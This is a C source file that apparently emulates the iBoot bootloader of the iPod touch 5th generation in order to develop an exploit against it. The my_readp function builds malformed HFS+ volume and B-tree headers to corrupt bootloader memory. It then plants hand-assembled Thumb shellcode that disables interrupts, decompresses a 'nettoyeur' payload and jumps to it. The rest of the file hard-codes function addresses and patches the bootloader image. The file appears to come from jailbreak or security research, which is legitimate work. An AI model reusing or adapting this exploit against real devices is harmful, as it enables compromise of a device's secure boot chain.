#define IMAGE_NAME              "iBoot.n78ap.RELEASE.dec" /* iPod touch 5th generation */
#define IMAGE_START             0x9FF00000 
#define IMAGE_END               0x9ff524a4 
#define IMAGE_SIZE              (IMAGE_END - IMAGE_START)
#define IMAGE_HEAP_SIZE         0xA4B5C 
#define IMAGE_BSS_START         0x9ff43780 
#define IMAGE_TEXT_END          0x9ff43000  /* XXX this is a lie */
#define IMAGE_STACK_SIZE        0x1000 
#define IMAGE_LOADADDR          0x80000000
#define IMAGE_HUGECHUNK         0x13000000


#define breakpoint1_ADDR        (0x18660 + 1) /* ResolvePathToCatalogEntry */ 

#define fuck1_ADDR              (0x194c2 + 1) 
#define fuck2_ADDR              (0x194d8 + 1) 
#define fuck3_ADDR              (0x195ee + 1) 

#define wait_for_event_ADDR     (0x00814) 
#define hugechunk_ADDR          (0x00cae + 1) 
#define gpio_pin_state_ADDR     (0x02c2c + 1) 
#define gpio_set_state_ADDR     (0x02c4c + 1) 
#define get_timer_us_ADDR       (0x01818 + 1) 
#define reset_cpu_ADDR          (0x0186C + 1) 
#define readp_ADDR              (0x19288 + 1) 
#define get_mem_size_ADDR       (0x1eccc + 1) 
#define putchar_ADDR            (0x332C4 + 1) 
#define adjust_stack_ADDR       (0x1E414 + 1) 
#define adjust_environ_ADDR     (0x1e910 + 1)
#define disable_interrupts_ADDR (0x34000 + 1) 
#define cache_stuff_ADDR        (0x21978 + 1) 
#define wtf_ADDR                (0x01748 + 1) 

#define iboot_warmup_ADDR       (0x00110) 
#define iboot_start_ADDR        (0x00BD0 + 1) 
#define main_task_ADDR          (0x00C3C + 1) 
#define panic_ADDR              (0x1FD74 + 1) 
#define system_init_ADDR        (0x1FE60 + 1) 
#define task_create_ADDR        (0x20490 + 1) 
#define task_start_ADDR         (0x205F0 + 1) 
#define task_exit_ADDR          (0x20614 + 1) 
#define printf_ADDR             (0x32B2C + 1) 
#define malloc_ADDR             (0x192a4 + 1) 
#define free_ADDR               (0x19358 + 1) 
#define create_envvar_ADDR      (0x17bc8 + 1) 
#define bcopy_ADDR              (0x335B0) 
#define decompress_lzss_ADDR    (0x24950 + 1) 


void NAKED
my_breakpoint1(void)
{
#ifdef __arm__
    __asm volatile (
        /* debug */
        BCALL(my_breakpoint1_helper)
        /* replacement insn */
        "ldrb r4, [r11];"
        /* return */
        "bx lr;"
    );
#endif /* __arm__ */
}


#ifdef __arm__
void
real_fuck1(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
{
    register unsigned int r8 __asm("r8");
    register unsigned int sp __asm("r11");
    if (sp <= (uintptr_t)image + 0x46be0 + 0x28 + 32 * 4) {
        unsigned int t2 = (uintptr_t)image + 0x46be0 + 0x28 + r3 * 4;
        fprintf(stderr, "_memalign: sp = 0x%x, r8 = 0x%x, r3 = 0x%x, r2 => 0x%x (0x%x)\n", sp, r8, r3, t2, sp - t2);
        dumpfile("DUMP_z1");
    }
    (void)(r0 && r1 && r2);
}

void
real_fuck2(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
{
    register unsigned int r9 __asm("r9");
    register unsigned int sp __asm("r11");
    if (sp <= (uintptr_t)image + 0x46be0 + 0x28 + 32 * 4) {
#define ULAT(x) (((x) & 0xFFFFF) + IMAGE_START)
        unsigned int t4 = r2 - 0x20;
        unsigned int t1 = r0 + (r1 << 5);
        unsigned int u4 = ULAT(r2) - 0x20;
        unsigned int u1 = ULAT(r0) + (r1 << 5);
#undef ULAT
        fprintf(stderr, "_memalign: sp = 0x%x, r0 = 0x%x, r1 = 0x%x (0x%x/0x%x), r2 = 0x%x, r3 = 0x%x, r4 => (0x%x/0x%x), r9 = 0x%x (0x%x)\n", sp, r0, r1, t1, u1, r2, r3, t4, u4, r9, t1 - t4);
        dumpfile("DUMP_z2");
    }
}

void
real_fuck3(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
{
    register unsigned int r8 __asm("r8");
    register unsigned int sp __asm("r11");
    if (sp <= (uintptr_t)image + 0x46be0 + 0x28 + 32 * 4) {
        fprintf(stderr, "_memalign: sp = 0x%x, r8 = 0x%x\n", sp, r8);
        dumpfile("DUMP_z3");
    }
    (void)(r0 && r1 && r2 && r3);
}
#endif /* __arm__ */


void NAKED
fuck1(void)
{
#ifdef __arm__
    /* can use: r6, r10, r11 (r0, r1, r2) */
    __asm volatile (
        "mov    r10, lr;"
        "mov    r11, sp;"
        "blx    _getstak;"              /* XXX hope it only destroys r0 */
        "mov    sp, r0;"
        "push   {r0-r12};"
        "blx    _real_fuck1;"
        "pop    {r0-r12};"
        "mov    sp, r11;"
        "add    r6, r4, #0x3f;"
        "bx     r10;"
    );
#endif /* __arm__ */
}

void NAKED
fuck2(void)
{
#ifdef __arm__
    /* can use: r4, r10, r11 */
    __asm volatile (
        "mov    r10, lr;"
        "mov    r11, sp;"
        "mov    r4, r0;"
        "blx    _getstak;"              /* XXX hope it only destroys r0 */
        "mov    sp, r0;"
        "mov    r0, r4;"
        "push   {r0-r12};"
        "blx    _real_fuck2;"
        "pop    {r0-r12};"
        "mov    sp, r11;"
        "sub    r4, r2, #0x40;"
        "bx     r10;"
    );
#endif /* __arm__ */
}

void NAKED
fuck3(void)
{
#ifdef __arm__
    /* can use: r10, r11 (r2, r3, r5, r6) */
    __asm volatile (
        "str    r0, [r8];"
        "mov    r10, lr;"
        "mov    r11, sp;"
        "mov    r6, r0;"
        "blx    _getstak;"              /* XXX hope it only destroys r0 */
        "mov    sp, r0;"
        "mov    r0, r6;"
        "push   {r0-r12};"
        "blx    _real_fuck3;"
        "pop    {r0-r12};"
        "mov    sp, r11;"
        "bx     r10;"
    );
#endif /* __arm__ */
}


void
my_adjust_stack(void)
{
#if 0
    CALL(malloc)(1856 - 32);
#elif 0
    int i;
    for (i = 0; i < 29; i++) {
        CALL(malloc)(32);
    }
#else
    void *ptr;
    ptr = CALL(malloc)(1856 - 128);
    CALL(free)(ptr);
    CALL(malloc)(928 - 128);
    CALL(malloc)(928 - 64);
#endif
}


void
my_adjust_environ(void)
{
#if 1
    CALL(create_envvar)("boot-ramdisk", "/a/b/c/d/e/f/g/h/i/j/k/l/m/disk.dmg", 0);
#endif
}


void
suck_sid(void)
{
    fprintf(stderr, "suck sid\n");
    dumpfile("DUMP2");
}


int
my_readp(void *ih, void *buffer, long long offset, int length)
{
#define TREEDEPTH 1
#define TRYFIRST 0
#define TRYLAST 0
    long long off;
    eprintf("%s(%p, %p, 0x%llx, %d)\n", __FUNCTION__, ih, buffer, offset, length);
#if TRYLAST
    if (buffer == (void *)IMAGE_LOADADDR) {
        return length;
    }
#endif
    off = lseek(rfd, offset, SEEK_SET);
    assert(off == offset);
    length = read(rfd, buffer, length);
#if TREEDEPTH || TRYFIRST || TRYLAST
#define NODE_SIZE (0x2000) /* XXX a size this large will use cache for catalog blocks */
#define TOTAL_NODES (0xFFF)
#define ROOT_NODE (0xFFFFFF / NODE_SIZE - 1)
#define EXTENT_SIZE ((unsigned long long)NODE_SIZE * (unsigned long long)TOTAL_NODES)
#define SHELLCODE_BASE 0x46B28
#define RAMDISK_START 0x466b0
#define BTREE_HEADER (0x469c0 + 0x14)
#define EXTENTS_BTREE_HEADER (BTREE_HEADER + 0x100) 

if (1) {
    static int seq = 0;
    switch (seq) {
        case 0:
            PUT_QWORD_BE(buffer, 0x110, 512ULL * 0x7FFFFFULL);  /* HFSPlusVolumeHeader::catalogFile.logicalSize */
            PUT_QWORD_BE(buffer,  0xc0, EXTENT_SIZE);           /* HFSPlusVolumeHeader::extentsFile.logicalSize */
            break;
        case 1:
            memset(buffer, 'E', length);
#if TREEDEPTH
            PUT_WORD_BE(buffer, 14, 3);                         /* BTHeaderRec::treeDepth */
#elif TRYLAST
            PUT_WORD_BE(buffer, 14, 2);                         /* BTHeaderRec::treeDepth */
#endif
            PUT_WORD_BE(buffer, 32, 512);                       /* BTHeaderRec::nodeSize */
            PUT_DWORD_BE(buffer, 36, 0x7FFFFF);                 /* BTHeaderRec::totalNodes */
#if TRYFIRST
            PUT_DWORD_BE(buffer, 16, (0xFFFFFF / 512 - 1));     /* BTHeaderRec::rootNode (trigger) */
#else
            PUT_DWORD_BE(buffer, 16, 3);                        /* BTHeaderRec::rootNode */
#endif
            memcpy((char *)buffer + 40, nettoyeur, (nettoyeur_sz < 216) ? nettoyeur_sz : 216);
            break;
        case 2:
            memset(buffer, 'F', length);
            if (nettoyeur_sz > 216) memcpy(buffer, nettoyeur + 216, nettoyeur_sz - 216);
            PUT_WORD_BE(buffer, 32, NODE_SIZE);                 /* BTHeaderRec::nodeSize */
            PUT_DWORD_BE(buffer, 36, TOTAL_NODES);              /* BTHeaderRec::totalNodes */
            PUT_DWORD_BE(buffer, 16, 0x500);                    /* BTHeaderRec::rootNode (must be big, but LSB must be zero) */
            PUT_WORD_LE(buffer, 20, 0);                         /* must be zero (see above) */
            PUT_WORD_LE(buffer, 14, 0);                         /* must be zero, to allow r3 to grow */
            PUT_DWORD_LE(buffer, 46,  (uintptr_t)image + 0x46b00);                      /* *r2 = r4 */
            PUT_DWORD_LE(buffer, 0x46b00 + 4 - EXTENTS_BTREE_HEADER + 2, /*(NODE_SIZE + 0x20) >> 5*/1);       /* *(r0 + 4) = r9 */
            PUT_DWORD_LE(buffer, 0x46b00 + 0x20 - EXTENTS_BTREE_HEADER, (uintptr_t)image + SHELLCODE_BASE + 1); /* r10 (code exec) */
            PUT_DWORD_LE(buffer, 0x46b00 + 0x24 - EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x46c44); /* r11 -> lr */
#if 0
            PUT_WORD_LE(buffer, SHELLCODE_BASE + 0 - EXTENTS_BTREE_HEADER, INSNT_ILLEGAL);
#else
            
            PUT_DWORD_LE(buffer, SHELLCODE_BASE +   0 - EXTENTS_BTREE_HEADER, INSNW_LDR_SP_PC80);
            PUT_DWORD_LE(buffer, SHELLCODE_BASE +   4 - EXTENTS_BTREE_HEADER, make_bl(0, SHELLCODE_BASE +  4, disable_interrupts_ADDR - 1));
            PUT_WORD_LE(buffer,  SHELLCODE_BASE +   8 - EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(4, 76));
            PUT_WORD_LE(buffer,  SHELLCODE_BASE +  10 - EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(0, 80));
            PUT_WORD_LE(buffer,  SHELLCODE_BASE +  12 - EXTENTS_BTREE_HEADER, INSNT_MOV_R_R(1, 4));
            PUT_WORD_LE(buffer,  SHELLCODE_BASE +  14 - EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(2, 80));
            PUT_DWORD_LE(buffer, SHELLCODE_BASE +  16 - EXTENTS_BTREE_HEADER, make_bl(1, SHELLCODE_BASE + 16, bcopy_ADDR));
            PUT_DWORD_LE(buffer, SHELLCODE_BASE +  20 - EXTENTS_BTREE_HEADER, INSNW_MOV_R1_2400);
            PUT_DWORD_LE(buffer, SHELLCODE_BASE +  24 - EXTENTS_BTREE_HEADER, INSNW_STRH_R1_R4_E2C);
            PUT_WORD_LE(buffer,  SHELLCODE_BASE +  28 - EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(0, 68));
            PUT_DWORD_LE(buffer, SHELLCODE_BASE +  30 - EXTENTS_BTREE_HEADER, INSNW_MOV_R1_80000000);
            PUT_WORD_LE(buffer,  SHELLCODE_BASE +  34 - EXTENTS_BTREE_HEADER, INSNT_STR_R1_R4_R0);
            PUT_WORD_LE(buffer,  SHELLCODE_BASE +  36 - EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(0, 64));
            PUT_WORD_LE(buffer,  SHELLCODE_BASE +  38 - EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(1, 68));
            PUT_WORD_LE(buffer,  SHELLCODE_BASE +  40 - EXTENTS_BTREE_HEADER, INSNT_STR_R1_R4_R0);
            PUT_DWORD_LE(buffer, SHELLCODE_BASE +  42 - EXTENTS_BTREE_HEADER, make_bl(0, SHELLCODE_BASE + 42, 0x20484));
            PUT_WORD_LE(buffer,  SHELLCODE_BASE +  46 - EXTENTS_BTREE_HEADER, INSNT_MOV_R_I(1, 0));
            PUT_WORD_LE(buffer,  SHELLCODE_BASE +  48 - EXTENTS_BTREE_HEADER, INSNT_STR_R1_R0_68);
            PUT_WORD_LE(buffer,  SHELLCODE_BASE +  50 - EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(0, 60));
            PUT_WORD_LE(buffer,  SHELLCODE_BASE +  52 - EXTENTS_BTREE_HEADER, INSNT_MOV_R_I(1, 0xFC));
            PUT_WORD_LE(buffer,  SHELLCODE_BASE +  54 - EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(2, 60));
            PUT_WORD_LE(buffer,  SHELLCODE_BASE +  56 - EXTENTS_BTREE_HEADER, INSNT_MOV_R_I(3, nettoyeur_sz));
            PUT_WORD_LE(buffer,  SHELLCODE_BASE +  58 - EXTENTS_BTREE_HEADER, INSNT_MOV_R_R(5, 0));
            PUT_DWORD_LE(buffer, SHELLCODE_BASE +  60 - EXTENTS_BTREE_HEADER, make_bl(0, SHELLCODE_BASE + 60, decompress_lzss_ADDR - 1));
            PUT_WORD_LE(buffer,  SHELLCODE_BASE +  64 - EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(0, 52));
            PUT_WORD_LE(buffer,  SHELLCODE_BASE +  66 - EXTENTS_BTREE_HEADER, INSNT_B_PC4);
            PUT_WORD_LE(buffer,  SHELLCODE_BASE +  74 - EXTENTS_BTREE_HEADER, INSNT_BLX_R(0));
            PUT_DWORD_LE(buffer, SHELLCODE_BASE +  76 - EXTENTS_BTREE_HEADER, make_bl(0, SHELLCODE_BASE + 76, cache_stuff_ADDR - 1));
            PUT_WORD_LE(buffer,  SHELLCODE_BASE +  80 - EXTENTS_BTREE_HEADER, INSNT_BLX_R(5));
            PUT_WORD_LE(buffer,  SHELLCODE_BASE +  82 - EXTENTS_BTREE_HEADER, INSNT_BX_R(4));
            PUT_DWORD_LE(buffer, SHELLCODE_BASE +  84 - EXTENTS_BTREE_HEADER, (uintptr_t)image + IMAGE_SIZE + IMAGE_HEAP_SIZE + IMAGE_STACK_SIZE);
            PUT_DWORD_LE(buffer, SHELLCODE_BASE +  88 - EXTENTS_BTREE_HEADER, (uintptr_t)image );
            PUT_DWORD_LE(buffer, SHELLCODE_BASE +  92 - EXTENTS_BTREE_HEADER, (uintptr_t)image );
            PUT_DWORD_LE(buffer, SHELLCODE_BASE +  96 - EXTENTS_BTREE_HEADER, IMAGE_BSS_START - IMAGE_START);
            PUT_DWORD_LE(buffer, SHELLCODE_BASE + 100 - EXTENTS_BTREE_HEADER, 0x41188 );
            PUT_DWORD_LE(buffer, SHELLCODE_BASE + 104 - EXTENTS_BTREE_HEADER, 0x19f00 );
            PUT_DWORD_LE(buffer, SHELLCODE_BASE + 108 - EXTENTS_BTREE_HEADER, INSN2_MOV_R0_0__STR_R0_R3 );
            PUT_DWORD_LE(buffer, SHELLCODE_BASE + 112 - EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x47000 );
            PUT_DWORD_LE(buffer, SHELLCODE_BASE + 116 - EXTENTS_BTREE_HEADER, (uintptr_t)image + BTREE_HEADER + 0x28 );
            PUT_DWORD_LE(buffer, SHELLCODE_BASE + 120 - EXTENTS_BTREE_HEADER, (uintptr_t)suck_sid );
            
            
#endif
            break;
#if TREEDEPTH
        default: {
            static long long oldpos = 0;
            if ((seq % 3) == 0) {
                ((unsigned char *)buffer)[9]++;                                         /* BTNodeDescriptor::height */
                ((unsigned char *)buffer)[8] = -(((unsigned char *)buffer)[9] == 1);    /* BTNodeDescriptor::kind */
                oldpos = offset;
            } else if (oldpos) {
                lseek(rfd, oldpos, SEEK_SET);
                read(rfd, buffer, length);
                oldpos = 0;
#if 0
                if (seq == 1 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 32, 0x10000);
                    break;
                }
#elif 0
                if (seq == 2 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 44, 0x10000);
                    break;
                }
#elif 0
                if (seq == 3 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 44, 0x10000);
                    break;
                }
#elif 0
                if (seq == 4 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 56, 0x10000);
                    break;
                }
#elif 0
                if (seq == 5 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 56, 0x10000);
                    break;
                }
#elif 0
                if (seq == 6 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 68, 0x10000);
                    break;
                }
#elif 0
                if (seq == 7 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 68, 0x10000);
                    break;
                }
#elif 0
                if (seq == 8 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 80, 0x10000);
                    break;
                }
#elif 0
                if (seq == 9 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 80, 0x10000);
                    break;
                }
#elif 0
                if (seq == 10 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 92, 0x10000);
                    break;
                }
#elif 0
                if (seq == 11 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 92, 0x10000);
                    break;
                }
#elif 0
                if (seq == 12 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 104, 0x10000);
                    break;
                }
#elif 1
                if (seq == 13 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 116, 0x10000);
                    break;
                }
#endif
            }
        }
#endif /* TREEDEPTH */
    }
#if TRYLAST
    if (seq == 2 + (14 * 2) * (2 + TREEDEPTH)) { /* XXX wot? why 14? */
        PUT_DWORD_BE(buffer, 0x11c, 1);
    }
#endif /* TRYLAST */
if (seq < 3) {
    int ofd;
    char tmp[256];
    sprintf(tmp, "BLOCK_%llx_%d", offset, seq);
    ofd = creat(tmp, 0644);
    if (ofd >= 0) {
        write(ofd, buffer, length);
        close(ofd);
    }
}
    seq++;
}
#endif
    return length;
}


void
check_irq_count(void)
{
    eprintf("irq_disable_count = 0x%x\n", *(unsigned int *)(image + 0x546c0 + 0x18));
}


void
my_cache_stuff(void)
{
#ifdef __APPLE__
    sys_icache_invalidate(image, IMAGE_SIZE + IMAGE_HEAP_SIZE);
#endif
}


#if USE_SIGNAL
#ifdef __arm__
int
dispatch_SEGV(void *si_addr, _STRUCT_ARM_THREAD_STATE *tctx)
{
    struct mmreg {
        unsigned long mmaddr;
        unsigned int pc;
        int reg;
        int val;
        int next;
    };

    static const struct mmreg mmregs[] = {
        /* end-of-table */
        { 0xFFFFFFFF, 0x00000, 0, 0, 0 },
    };

    const struct mmreg *m;

    if (si_addr == 0) {
        if (tctx->__pc == (uintptr_t)(image + 0x202a2)) {
            /* idle task crap (read from *0) */
            tctx->__r[0] = *(uint32_t *)(image);
            tctx->__pc += 2;
            return 0;
        }
        if (tctx->__pc == (uintptr_t)(image + 0x20502)) {
            tctx->__r[1] = *(uint32_t *)(image);
            tctx->__pc += 2;
            return 0;
        }
    }

    for (m = mmregs; m->mmaddr != 0xFFFFFFFF; m++) {
        if (si_addr == (void *)m->mmaddr && tctx->__pc == (uintptr_t)(image + m->pc)) {
            int reg = m->reg;
            int val = m->val;
            if (reg >= 0) {
                tctx->__r[reg] = val;
            }
            tctx->__pc += m->next;
            return 0;
        }
    }

    return -1;
}

int
dispatch(int signum, void *si_addr, _STRUCT_ARM_THREAD_STATE *tctx)
{
#if USE_SIGNAL > 1
    if (signum == ILLNO) {
        if ((tctx->__cpsr & 0x20) == 0 && *(uint32_t *)si_addr == INSNA_ILLEGAL) {
            /* ARM handlers: tctx->__pc += 4; */
            uintptr_t addr = (unsigned char *)si_addr - image;
            switch (addr) {
                case wait_for_event_ADDR:
                    my_wait_for_event();
            }
        } else if ((tctx->__cpsr & 0x20) != 0 && *(uint16_t *)si_addr == INSNT_ILLEGAL) {
            /* Thumb handlers: tctx->__pc += 2; */
            uintptr_t addr = (unsigned char *)si_addr - image + 1;
            switch (addr) {
                case cache_stuff_ADDR:
                    my_cache_stuff();
                    tctx->__pc = tctx->__lr;
                    return 0;
                case hugechunk_ADDR:
                    tctx->__r[0] = (uint32_t)gethuge();
                    tctx->__pc += 4;
                    return 0;
                case gpio_pin_state_ADDR:
                    tctx->__r[0] = my_gpio_pin_state(tctx->__r[0]);
                    tctx->__pc = tctx->__lr;
                    return 0;
                case gpio_set_state_ADDR:
                    my_gpio_set_state(tctx->__r[0], tctx->__r[1]);
                    tctx->__pc = tctx->__lr;
                    return 0;
                case get_timer_us_ADDR:
                    *(uint64_t *)(&tctx->__r[0]) = my_get_timer_us();
                    tctx->__pc = tctx->__lr;
                    return 0;
                case reset_cpu_ADDR:
                    my_reset_cpu();
                case readp_ADDR:
                    tctx->__r[0] = my_readp((void *)tctx->__r[0], (void *)tctx->__r[1], *(uint64_t *)(&tctx->__r[2]), *(uint32_t *)tctx->__sp);
                    tctx->__pc = tctx->__lr;
                    return 0;
                case get_mem_size_ADDR:
                    tctx->__r[0] = my_get_mem_size();
                    tctx->__pc = tctx->__lr;
                    return 0;
                case putchar_ADDR:
                    putchar(tctx->__r[0]);
                    tctx->__pc = tctx->__lr;
                    return 0;
                case adjust_stack_ADDR:
                    my_adjust_stack();
                    tctx->__pc = tctx->__lr;
                    return 0;
                case adjust_environ_ADDR:
                    my_adjust_environ();
                    tctx->__pc = tctx->__lr;
                    return 0;
                case breakpoint1_ADDR:
                    my_breakpoint1_helper(tctx->__r[0], tctx->__r[1], tctx->__r[2], tctx->__r[3], tctx->__sp, tctx->__lr);
                    tctx->__r[4] = *(unsigned char *)tctx->__r[11];
                    tctx->__pc += 4;
                    return 0;
            }
        }
    }
#endif /* USE_SIGNAL > 1 */
    if (signum == SIGSEGV) {
        return dispatch_SEGV(si_addr, tctx);
    }
    return -1;
}
#endif /* __arm__ */
#endif /* USE_SIGNAL */


void
patch_image(unsigned char *image)
{
    /* jump directly to warmup */
    *image = (iboot_warmup_ADDR - 8) / 4;
    /* heap hardcoded offset */
    *(uint32_t *)(image + 0x1fe6c) = INSN2_LDR_R1_PC__B_PLUS4; 
    *(void **)(image + 0x1fe70) = XLAT(IMAGE_END + IMAGE_HEAP_SIZE); 
    /* clean data cache */
    *(uint32_t *)(image + 0x2157c) = INSNA_RETURN; 
#if !USE_SIGNAL
    /* idle task crap (read from *0) */
    *(uint16_t *)(image + 0x202a2) = INSNT_NOP; 
    *(uint16_t *)(image + 0x20502) = INSNT_MOV_R_R(1, 0); 
#endif /* !USE_SIGNAL */
    /* timer 2 */
    *(uint32_t *)(image + 0x1F618) = INSN2_RETURN_0; 
    /* task switch FPU */
    *(uint32_t *)(image + 0x219AC) = INSNA_MOV_R2_0; 
    *(uint32_t *)(image + 0x219DC) = INSNA_MOV_R2_0; 
    /* bzero during mmu_init */
    *(uint32_t *)(image + 0x20A3C) = INSN2_NOP__NOP; 
    /* nop some calls during iboot_start */
    *(uint32_t *)(image + 0x00BD6) = INSN2_NOP__NOP; 
#if 0 /* adjust_stack */
    *(uint32_t *)(image + 0x00BDE) = INSN2_NOP__NOP; 
#endif

    /* nop spi stuff */
#if 0 /* adjust_environ */
    *(uint32_t *)(image + 0xcba) = INSN2_NOP__NOP; 
#endif
    /* FPEXC triggered by nvram_save() */
    *(uint32_t *)(image + 0x498) = INSNA_NOP; 
    *(uint32_t *)(image + 0x490) = INSNA_NOP; 

    /* pretend we have nand device? */
    *(uint32_t *)(image + 0xa70) = INSN2_MOV_R0_1__MOV_R0_1; 
    *(uint32_t *)(image + 0x18EBE) = INSN2_MOV_R0_1__MOV_R0_1; 

    /* make main_task show SP */
    *(uint16_t *)(image + 0xD94) = INSNT_MOV_R_R(1, 13); 
    *(uint8_t *)(image + 0x343E4) = 'x'; 
    /* show task structure */
    *(void **)(image + 0xFA4) = image + 0x43460; 
    *(uint8_t *)(image + 0x343D0) = 'x'; 

    /* nop some more hw */
    *(uint32_t *)(image + 0x0bb48) = INSN2_RETURN_0; 
    *(uint32_t *)(image + 0x01770) = INSN2_RETURN_0; 
    *(uint32_t *)(image + 0x026D8) = INSN2_RETURN_0; 
    *(uint32_t *)(image + 0x00D60) = INSN2_NOP__NOP;
    *(uint16_t *)(image + 0x0c134) = INSNT_NOP; /* XXX loop */
    *(uint16_t *)(image + 0x1F7D2) = INSNT_NOP;
#if 0
  *(uint16_t *)(image + 0xXXXXX) = INSNT_NOP;
#endif
    *(uint32_t *)(image + 0x1eb40) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1ed42) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1ed62) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1ed9c) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1edb4) = INSN2_RETURN_21;
    *(uint32_t *)(image + 0x1edcc) = INSN2_RETURN_0;

    /* nocache */
#if 0
    *(uint32_t *)(image + 0x18DEC) = INSNT_RETURN;
#endif
}


void
patch_nettoyeur(unsigned char *nettoyeur)
{
    *(void **)(nettoyeur + 0xDC) = image + *(uint32_t *)(nettoyeur + 0xDC) - (IMAGE_LOADADDR + 0x4000000);
    *(void **)(nettoyeur + 0xE0) = image + *(uint32_t *)(nettoyeur + 0xE0) - (IMAGE_LOADADDR + 0x4000000);
    *(void **)(nettoyeur + 0xE4) = image + *(uint32_t *)(nettoyeur + 0xE4) - (IMAGE_LOADADDR + 0x4000000);
    *(void **)(nettoyeur + 0xE8) = XLAT(*(uint32_t *)(nettoyeur + 0xE8));
}
